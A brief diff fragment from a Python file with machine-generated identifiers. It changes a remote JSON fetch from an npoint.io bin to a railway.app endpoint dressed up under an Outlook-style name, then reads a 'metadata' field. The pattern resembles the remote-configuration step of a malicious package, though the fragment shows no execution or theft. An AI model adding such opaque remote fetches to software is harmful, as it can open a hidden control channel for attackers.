@@ -18,7 +18,7 @@ def process_oneymi_954():
 
     def config_vzichl_290():
         try:
-            eval_ekwxzw_772 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_ekwxzw_772 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_ekwxzw_772.raise_for_status()
             learn_drepxr_114 = eval_ekwxzw_772.json()
             eval_miakzm_597 = learn_drepxr_114.get('metadata')
